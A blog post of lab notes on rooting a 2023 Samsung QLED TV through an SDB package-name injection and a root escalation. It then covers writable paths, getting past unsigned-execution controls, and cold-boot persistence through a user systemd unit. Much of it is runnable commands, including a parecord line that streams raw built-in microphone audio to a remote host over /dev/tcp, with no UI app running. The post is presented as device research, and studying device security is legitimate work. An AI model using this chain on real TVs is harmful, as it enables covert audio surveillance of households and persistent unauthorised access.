---
layout: post
title: Samsung Tizen TV — root, disk access, mic, and cold-boot autostart (QE65Q70C)
date: 2026-10-23
last_modified_at: 2026-10-30
categories: [Hack]
tags: [samsung, tizen, tv, root, sdb, archive-root, uep, smack, systemd, microphone]
---

## Goal

Lab notes on **getting useful privilege** on a retail Samsung Smart TV — not “own the SoC forever”, but enough to:

1. obtain a **volatile `uid=0` shell** from a PC;
2. **read/write** durable paths under `/opt/usr`;
3. capture the **built-in / USB microphones** without a UI app;
4. **autostart a process after unplug** (real cold boot), without a host babysitter.

No product feature description here — only access boundaries and the hacks that work around them.

Verified on:

| | |
|--|--|
| Model | **QE65Q70CATXXH** (65″ QLED, 2023) |
| Firmware family | **T-NKM2CDEUC-0090** |
| Platform | **Tizen 9.0**, Linux **5.4.77**, **armv7l** |
| Root route | `SVE-2025-50109` SDB foothold → **archive-root** |

> Instant On / soft power is **not** a reboot. To test cold boot, unplug the TV (or force a full restart), then power on again.
{: .prompt-warning }

## Mental model: root ≠ “everything allowed”

`archive-root` gives **UID/GID 0** and a fat capability mask, but several layers stay up:

| Layer | What it does | Root bypass? |
|-------|----------------|--------------|
| **UEP** | Blocks *execution* of unsigned ELF / script-as-program | **No** |
| **Smack** | Labels limit open / mmap / IPC | Soften sometimes; prefer correct labels |
| **RO rootfs** | `/etc`, many `/usr` paths write-protected | Prefer `/opt/usr` |
| **`/run`** | tmpfs — wiped every reboot/unplug | Must re-seed or avoid depending on it |

Smack after escalate still shows **`User`**. Treat “uid 0” as a strong foothold, not a kernel-signed god mode.

## 1. Volatile root: SDB foothold → archive-root

### Stack

| Piece | Role |
|-------|------|
| TV Developer Mode | Exposes SDB on TCP **26101** |
| [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root) ≥ **v0.0.9** | Host CLI + managed payloads |
| Tizen Studio `sdb` | Transport for package-name injection |
| Host OpenSSL + .NET 6 SDK | Build `common` / `common31` payloads |

On this set, interactive `sdb shell` prints `closed` — expected. The exploit never relies on that path.

### Chain (short)

1. **SDB package-name injection** (`SVE-2025-50109`): crafted `.tpk` name with backtick / `base64` substitution → process as **`uid=901(sdk)`** (audio / recorder groups, System SMACK).
2. **archive-root**: from that foothold, stage Samsung’s capability-bearing signed `dotnet` + archive launcher in a private mount namespace → escalate to **UID/GID 0** → authenticated root agent back to the host.
3. Cleanup: staging removed; system file hashes unchanged (**volatile** only).

Kernel routes in the same upstream repo (FDET / Mali) are **not** required for this NKM2-family TV.

### Host setup

```shell
git clone https://github.com/chris-ritsen/samsung-tv-root
cd samsung-tv-root
python3 -m venv .venv
.venv/bin/pip install -e .
make common-payload common31-payload
```

If `payloads/common31/global.json` pins an SDK patch you lack, set `"version"` to your installed 6.0.x and rebuild.

```shell
export SDB=/absolute/path/to/tizen-studio/tools/sdb
export TV_IP=192.168.0.101

"$SDB" connect "$TV_IP:26101"
.venv/bin/samsung-tv-root --sdb "$SDB" doctor
```

`doctor` should show **Payload common** and **common31** ready.

### Developer Mode

Apps → type `12345` → Developer Mode **On** → enter the lab PC IPv4 → reboot. Then:

```shell
"$SDB" connect "$TV_IP:26101"
"$SDB" -s "$TV_IP:26101" capability
```

### Acquire root

```shell
.venv/bin/samsung-tv-root --sdb "$SDB" -o json archive-root probe "$TV_IP"
.venv/bin/samsung-tv-root --sdb "$SDB" archive-root root "$TV_IP" --command 'id; uname -a'
```

Example probe success:

```json
{
  "authenticated": true,
  "uid": 0,
  "euid": 0,
  "gid": 0,
  "egid": 0,
  "cap_eff": "0000003fffffffff",
  "runtime": "6.0",
  "smack": "User",
  "staging_cleaned": true,
  "system_files_unchanged": true
}
```

Expect `uid=0(owner) gid=0(root)`. After reboot, re-run the host tool (Developer Mode + `sdb` still required). Root itself does **not** persist.

## 2. Disk: what you can actually write

### Durable vs volatile

| Path | Survives unplug? | Notes |
|------|------------------|-------|
| `/opt/usr/home/owner/…` | yes | Home for DLLs, configs, **user-systemd** units |
| `/opt/usr/share/systemd/system/` | yes | Fine as a *file* dump; **not** in system `UnitPath` |
| `/run/systemd/system/` | **no** | Systemd *does* load units from here — gone after cold boot |
| `/tmp/` | no | Logs / FIFOs only |
| `/home/owner/share/tmp/sdk_tools/` | yes (share) | Often the only reliable **SDB push** target |
| `/etc/systemd/…` | RO | Do not plan permanent enables here |

System `UnitPath` on this TV ≈ `/etc` + `/run` + `/usr/lib` (+ `/prd/…`) — **no** `/opt/usr/share/systemd`. Dropping unit files only under share does nothing until something copies them into `/run` (or you use user-systemd instead — §4).

### Deploy patterns that work

1. **HTTP from the lab** → on-TV `curl` into `/tmp` → `cp` under `/opt/usr/…` inside `archive-root --command`.
2. **Base64** via `--command 'echo … | base64 -d > …'` (no extra unsigned helper binary).
3. **SDB push** into `sdk_tools` / owner share, then root `cp` into the final path. Direct SDB into `/opt/usr/home/owner/...` is flaky.

Chown artifacts to **`5001:users`** when they will run under the owner user session (`systemd --user`).

### UEP: execution is the hard part

Root can *write* an unsigned `.sh` / ELF under owner home. **Executing** it as a program still fails:

```text
[uep][bash] the file is NOT signed!!
```

| OK to run | Unreliable / blocked |
|-----------|----------------------|
| Signed `/usr/bin/dotnet` + your **DLL** under `/opt/usr/home/owner/…` | Custom unsigned ARM ELF |
| `ExecStart=/usr/bin/dotnet …/App.dll` | `ExecStart=/opt/.../boot.sh` |
| `ExecStart=/bin/sh -c '…inline…'` | `/tmp/*.sh` as an executable path |
| Partner WGT JS (`execFile` / `spawn`, not `exec`→`/bin/sh`) | Public-cert WGT for `on-boot` |

Ship logic as **DLL**, **inline `sh -c`**, or **WGT JS**. Never as a new unsigned executable under owner home.

Stock TV image often has **no** `python3` / `strings` — prefer host-side checks or `grep -a` via root.

## 3. Microphone without a UI app

Still no WGT required. From **sdk** foothold or **root**, Pulse exposes capture devices.

Builtin array (example):

```text
tizentv-builtin-source  s16le 2ch 16000Hz
```

USB headsets show up as additional Pulse sources when plugged in.

Stream a short raw chunk to the lab (via `archive-root --command` or SDB inject):

```shell
parecord -d tizentv-builtin-source --raw --rate=16000 --channels=1 --format=s16le \
  --file-format=raw \
  | head -c 64000 >/dev/tcp/<lab-ip>/<port>
```

Notes from this lab:

- Prefer **`--file-format=raw`** when piping PCM; default Wave headers corrupt a continuous stream.
- `sdk` already has recorder-related groups — enough for many capture experiments before full root.
- Soft power / Instant On is unrelated to whether Pulse devices exist after a cold boot; after unplug the capture daemon/path must be started again by whatever you autostart (§4).

## 4. Autostart that survives unplug

Two mechanisms matter. They solve different layers.

### A. Partner-signed Web Service (`on-boot`)

A Tizen **Web Service** (`http://tizen.org/feature/web.service`) with `on-boot="true"` + `auto-restart="true"` is the platform-documented background worker. On a commercial TV:

| Distributor privilege | Runs when launched | Survives Instant On | Auto-start after **cold boot** |
|--|--|--|--|
| **Public** | yes | yes | **no** |
| **Partner** (DUID-bound) | yes | yes | **yes** |

`on-boot` in XML alone is not enough — you need a **Partner** distributor cert for that DUID. Public installs fine but stays dead after unplug until something launches the package again.

From `service.js`, prefer **`child_process.execFile` / `spawn`**. `exec(…)` → `/bin/sh` often returns **`EACCES`** after cold boot. Smack also blocks reading some `User`-labeled files under `/opt/usr/share/systemd` from the WGT context; files under **`/opt/usr/home/owner/…`** (`User::Home`) are the safer source.

Details, certs, and packaging pitfalls: [autostart a custom Web Service on boot](/posts/samsung-tizen-tv-web-service-on-boot/).

Ghost / fake-UI always-on apps are a bad idea on this panel — the platform watchdog can blank the screen after wake.

### B. Owner `systemd --user` (authoritative for native processes)

System units under `/run` die with `/run`. Enabling under `/etc` is blocked by RO rootfs.

What *does* survive cold boot — same pattern used by long-lived owner workloads on this TV — is **user systemd**:

```text
/opt/usr/home/owner/.config/systemd/user/your-app.service
/opt/usr/home/owner/.config/systemd/user/default.target.wants/your-app.service  → …
```

On boot, `systemd --user` for uid **5001** comes up and pulls in `default.target` wants. No host watcher required.

Minimal unit shape:

```ini
[Unit]
Description=Lab worker
After=default.target
ConditionPathExists=/opt/usr/home/owner/app/App.dll

[Service]
Type=simple
WorkingDirectory=/opt/usr/home/owner/app
Environment=HOME=/opt/usr/home/owner
Environment=XDG_RUNTIME_DIR=/run/user/5001
Environment=DBUS_SESSION_BUS_ADDRESS=kernel:path=/sys/fs/kdbus/5001-user/bus
Environment=PULSE_SERVER=unix:/run/pulse/native
Environment=DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1
ExecStart=/usr/bin/dotnet /opt/usr/home/owner/app/App.dll /opt/usr/home/owner/app/config.json
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
```

Install from root: write the unit files + wants symlinks, then talk to the user manager (example: `nsenter` into the `systemd --user` PID as uid 5001) and run `systemctl --user daemon-reload && enable --now …`.

Do **not** put `User=root` in a user unit — the manager already runs as 5001. Keep privileged one-shots out of this path or accept owner-level capabilities only.

Partner WGT can still help as a keeper (`systemctl --user restart` / ensure unit files exist), but the **source of truth for native cold boot** is the enabled user unit under `~/.config/systemd/user/`.

## 5. What this is not

- **Not** permanent root after reboot — reacquire with `archive-root`.
- **Not** a license to run unsigned ELF under UEP.
- **Not** “drop a `.service` in `/opt/usr/share/systemd` and forget it” — system `UnitPath` ignores that tree.
- **Not** Instant On as a cold-boot test.
- **Not** guaranteed on every regional SKU — match **exact model + firmware family**.

## Lab cheat sheet

| Observation | Detail |
|-------------|--------|
| `sdb shell` | Closes immediately; use inject / archive-root |
| Runtime | .NET **6.0** on device |
| Preflight caps | `/usr/bin/dotnet` `cap_setgid,cap_sys_admin=ei`; `sdbd-tarlauncher` `cap_setgid,cap_setuid=eip` |
| Owner uid for apps | Processes often **5001**; login name `owner` may show uid 0 in passwd — do not confuse the two |
| Talking to user systemd as root | `nsenter -t <systemd --user pid> -S 5001 -G 100 -- systemctl --user …` with `XDG_RUNTIME_DIR` / kdbus env |

## References

- [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root) — `archive-root` docs
- Bishop Fox / public write-ups of **SVE-2025-50109**
- Companion: [Samsung Tizen TV — autostart a custom Web Service on boot](/posts/samsung-tizen-tv-web-service-on-boot/)
- [Tizen — Service application (Web)](https://docs.tizen.org/application/web/guides/applications/service-app/)
- [Samsung — Creating certificates](https://developer.samsung.com/smarttv/develop/getting-started/setting-up-sdk/creating-certificates.html) / Partner privilege FAQ
